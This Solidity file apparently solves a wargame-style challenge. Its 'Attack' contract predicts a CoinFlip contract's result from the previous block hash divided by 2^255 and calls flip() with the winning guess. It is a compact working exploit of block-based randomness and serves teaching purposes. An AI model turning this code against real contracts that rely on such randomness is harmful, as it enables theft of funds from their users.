// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol";
import "github/NomicFoundation/hardhat/packages/hardhat-core/console.sol";
import "./CoinFlip.sol";

contract Attack { 
    CoinFlip public c ;
    constructor(CoinFlip ad ) public{
        c=ad;
    }
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    using SafeMath for uint256;
    function guess() public  {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinf = blockValue.div(FACTOR);
        if (coinf==1){
            c.flip(true);
        }
        else
            c.flip(false);    
    }
}